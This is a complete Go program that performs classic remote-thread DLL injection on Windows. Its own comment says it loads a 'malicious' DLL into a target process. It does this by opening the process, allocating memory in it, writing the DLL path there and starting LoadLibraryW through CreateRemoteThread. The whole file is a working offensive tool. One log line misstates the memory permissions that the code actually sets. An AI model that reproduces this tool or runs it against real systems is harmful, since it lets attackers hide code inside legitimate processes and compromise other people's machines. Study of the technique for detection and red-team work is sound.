// dll_injection.go injects a (malicious) DLL into a specified process on Windows
// systems using direct API calls for process manipulation and memory operations

package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

const (
	PROCESS_VM_OPERATION = 0x0008
	PROCESS_VM_WRITE     = 0x0020
	MEM_RESERVE          = 0x00002000
	MEM_COMMIT           = 0x00001000
	PAGE_READWRITE       = 0x04
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	openProcess        = kernel32.MustFindProc("OpenProcess")
	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("[-] usage:", os.Args[0], "<PID> <PATH_TO_DLL>")
		return
	}

	dwPID, _ := strconv.Atoi(os.Args[1])
	DLLPath := os.Args[2]

	fmt.Printf("[*] trying to get a handle to the process (%d)\n", dwPID)

	hProcess, _, err := openProcess.Call(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, 0, uintptr(dwPID))
	if hProcess == 0 {
		fmt.Printf("[-] failed to get a handle to the process, error: %v\n", err)
		return
	}

	fmt.Printf("[+] got a handle to the process\n\\---0x%x\n", hProcess)

	rBuffer, _, err := virtualAllocEx.Call(hProcess, 0, uintptr(len(DLLPath)*8), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)
	if rBuffer == 0 {
		fmt.Printf("[-] failed to allocate memory in process, error: %v\n", err)
		return
	}

	fmt.Printf("[+] allocated %d bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", len(DLLPath)*8)

	dllPathPtr, _ := syscall.UTF16PtrFromString(DLLPath)
	writeResult, _, errWrite := writeProcessMemory.Call(hProcess, rBuffer, uintptr(unsafe.Pointer(dllPathPtr)), uintptr(len(DLLPath)*8), 0)
	if writeResult == 0 {
		fmt.Printf("[-] failed to write DLL path to process memory, error: %v\n", errWrite)
		return
	}

	fmt.Printf("[+] wrote DLL path to process memory\n")

	loadLibrary := syscall.MustLoadDLL("kernel32.dll").MustFindProc("LoadLibraryW")
	hThread, _, err := createRemoteThread.Call(hProcess, 0, 0, loadLibrary.Addr(), rBuffer, 0, uintptr(0))
	if hThread == 0 {
		fmt.Printf("[-] failed to get a handle to the new thread, error: %v\n", err)
		return
	}

	fmt.Printf("[+] got a handle to the newly-created thread\n\\---0x%x\n", hThread)

	fmt.Printf("[*] waiting for thread to finish executing\n")
	syscall.WaitForSingleObject(syscall.Handle(hThread), syscall.INFINITE)
	fmt.Printf("[+] thread finished executing, cleaning up\n")

	syscall.CloseHandle(syscall.Handle(hThread))
	syscall.CloseHandle(syscall.Handle(hProcess))
	fmt.Printf("[+] finished ദ്ദി( • ᴗ - ) ✧\n")
}
